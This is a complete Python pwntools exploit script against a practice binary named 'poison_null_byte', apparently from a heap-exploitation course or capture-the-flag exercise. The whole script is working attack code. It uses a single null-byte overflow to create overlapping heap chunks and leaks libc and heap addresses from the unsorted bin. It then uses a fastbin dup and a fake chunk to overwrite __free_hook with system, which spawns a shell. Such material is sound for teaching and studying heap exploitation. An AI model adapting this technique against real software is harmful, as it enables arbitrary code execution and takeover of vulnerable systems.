#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("poison_null_byte")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size.
# Returns chunk index.
def malloc(size):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.recvuntil(b"> ")
    index += 1
    return index - 1

# Select the "edit" option; send index & data.
def edit(index, data):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")

# Select the "free" option; send index.
def free(index):
    io.send(b"3")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ", timeout=1)

# Select the "read" option; read size bytes.
def read(index, size):
    io.send(b"4")
    io.sendafter(b"index: ", f"{index}".encode())
    r = io.recv(size)
    io.recvuntil(b"> ")
    return r

io = start()
io.recvuntil(b"> ")
io.timeout = 0.1

# =============================================================================

# Request 2 chunks.
# Limit 0 <= x <= 0x3e8

# ================= Setup

overflow = malloc(0x88)
victim = malloc(0x208)
consolidate = malloc(0x88)
guard = malloc(0x18)

edit(victim, b"X" * (0x208 - 0x18) + p64(0x200)) # To pass size vs prevsize check

free(victim)

# Edit "overflow".
edit(overflow, b"Y"*0x88) # 0x200

# Remaindering
chunkB1 = malloc(0xf8)
chunkB2 = malloc(0xf8)

free(chunkB1)
free(consolidate)

# ================= Leak Unsortedbin & heap

chunkB1 = malloc(0xf8)

free(overflow) # To change bk and fd

leak = read(chunkB2, 16)
leak_arena = u64(leak[:8])
leak_heap = u64(leak[8:])
libc.address = leak_arena - libc.sym["main_arena"] - 88


info("Heap: " + hex(leak_heap))
info("Libc base: " + hex(libc.address))

# ================= Reset Heap State and fastbin dup
overflow = malloc(0x88)

dup = malloc(0x68)

free(dup)

# ================= Craft fake chunk
fake_chunk = flat(
  0x21,
  0xdeadbeef,
  libc.sym["__free_hook"] - 0x23,
)

overwrite_fastbin_dup = p64(libc.sym["__free_hook"] - 0x16)

edit(chunkB2, overwrite_fastbin_dup + b"A"*96 + fake_chunk)

# ================= To trigger unsortedbin attack (partial unlink) write at libc.sym["__free_hook"] - 0x13
malloc(0x18)

dup = malloc(0x68)

edit(dup, b"/bin/sh\x00")
target = malloc(0x68)

edit(target, b"A" * 0x6 + p64(libc.sym["system"]))

free(dup)

# =============================================================================

io.interactive()
